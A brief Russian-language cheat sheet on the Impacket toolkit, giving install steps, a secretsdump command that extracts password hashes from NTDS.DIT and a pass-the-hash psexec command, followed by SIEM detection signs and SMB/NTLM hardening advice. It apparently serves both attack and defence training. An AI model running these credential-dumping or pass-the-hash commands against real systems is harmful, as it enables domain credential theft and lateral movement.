# Impacket — инструменты для работы с протоколами Windows

## 📦 Установка
```bash
sudo apt update
sudo apt install python3-impacket
# или из GitHub:
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

## 🔹 Примеры использования
1. Извлечение NTDS.DIT и SYSTEM:
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
2. Pass-the-Hash через psexec:
```bash
psexec.py DOMAIN/user@target -hashes :<NTLM_HASH>
```

## 📊 SIEM
- Event ID 4624 (Logon Type 3).
- Доступ к административным шарам.

## 🛡 Защита
- Включить SMB/LDAP signing.
- Запретить NTLM.
